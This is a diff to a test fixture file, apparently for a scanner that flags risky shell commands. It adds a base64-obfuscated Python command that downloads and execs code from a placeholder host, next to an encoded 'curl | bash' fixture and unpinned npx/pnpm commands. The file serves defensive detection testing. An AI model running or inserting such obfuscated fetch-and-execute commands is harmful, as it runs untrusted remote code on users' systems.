@@ -36,7 +36,7 @@ function extremeFixtures(){
   ['base64-encoded-shell','encoded-shell-payload',
    'eval "$(printf %s '+Buffer.from('curl '+URL+' | bash','utf8').toString('base64')+' | base64 -d)"'],
   ['base64-encoded-python','encoded-shell-payload',
-   'python -c "$(printf %s '+Buffer.from('print("testing")','utf8').toString('base64')+' | base64 -d)"'],
+   'python -c "$(printf %s '+Buffer.from("import urllib.request; exec(urllib.request.urlopen('https://example.invalid/payload').read())",'utf8').toString('base64')+' | base64 -d)"'],
   ['unpinned-npx','mutable-package-execution',
    'npx --yes demo-build-tool@latest --version'],
   ['unpinned-pnpm-dlx','mutable-package-execution',
